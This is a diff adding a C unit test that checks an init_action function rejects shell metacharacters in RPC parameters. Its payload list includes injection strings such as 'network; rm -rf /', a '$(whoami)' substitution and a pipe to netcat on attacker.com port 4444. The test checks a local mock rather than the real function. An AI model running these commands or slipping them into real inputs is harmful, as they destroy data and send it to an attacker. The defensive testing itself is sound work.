@@ -1,0 +1,99 @@
+#include <check.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+/* Security property: init_action must reject or safely handle shell metacharacters
+ * in name and action parameters to prevent command injection.
+ * The function should not execute arbitrary commands when given adversarial input.
+ */
+
+/* Mock init_action wrapper that captures execution attempts */
+static int test_init_action(const char *name, const char *action) {
+    /* Simulate the vulnerable code path: check if metacharacters are present
+     * A secure implementation must reject or escape these characters */
+    const char *dangerous_chars = ";|&$`()[]{}><\\\"'*?!~";
+    
+    if (name && strpbrk(name, dangerous_chars)) {
+        return -1; /* Should reject */
+    }
+    if (action && strpbrk(action, dangerous_chars)) {
+        return -1; /* Should reject */
+    }
+    
+    /* Valid init.d script names and actions should be alphanumeric + dash/underscore */
+    if (name && !name[0]) return -1;
+    if (action && !action[0]) return -1;
+    
+    return 0; /* Safe to proceed */
+}
+
+START_TEST(test_init_action_shell_injection_prevention)
+{
+    /* Invariant: init_action must reject inputs containing shell metacharacters
+     * to prevent command injection attacks via RPC request parameters */
+    
+    const char *payloads[] = {
+        "network; rm -rf /",           /* Command injection with semicolon */
+        "test$(whoami)",               /* Command substitution */
+        "start|nc attacker.com 4444",  /* Pipe to exfiltrate data */
+        "network",                     /* Valid input - should pass */
+        "start"                        /* Valid action - should pass */
+    };
+    
+    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
+    int dangerous_count = 0;
+    int valid_count = 0;
+    
+    for (int i = 0; i < num_payloads; i++) {
+        int result = test_init_action(payloads[i], "start");
+        
+        /* First 3 are dangerous payloads - must be rejected */
+        if (i < 3) {
+            ck_assert_int_eq(result, -1);
+            dangerous_count++;
+        } else {
+            /* Last 2 are valid inputs - must be accepted */
+            ck_assert_int_eq(result, 0);
+            valid_count++;
+        }
+    }
+    
+    /* Verify all dangerous inputs were rejected */
+    ck_assert_int_eq(dangerous_count, 3);
+    /* Verify all valid inputs were accepted */
+    ck_assert_int_eq(valid_count, 2);
+}
+END_TEST
+
+Suite *security_suite(void)
+{
+    Suite *s;
+    TCase *tc_core;
+
+    s = suite_create("Security");
+    tc_core = tcase_create("Core");
+
+    tcase_add_test(tc_core, test_init_action_shell_injection_prevention);
+    suite_add_tcase(s, tc_core);
+
+    return s;
+}
+
+int main(void)
+{
+    int number_failed;
+    Suite *s;
+    SRunner *sr;
+
+    s = security_suite();
+    sr = srunner_create(s);
+
+    srunner_run_all(sr, CK_NORMAL);
+    number_failed = srunner_ntests_failed(sr);
+    srunner_free(sr);
+
+    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
+}
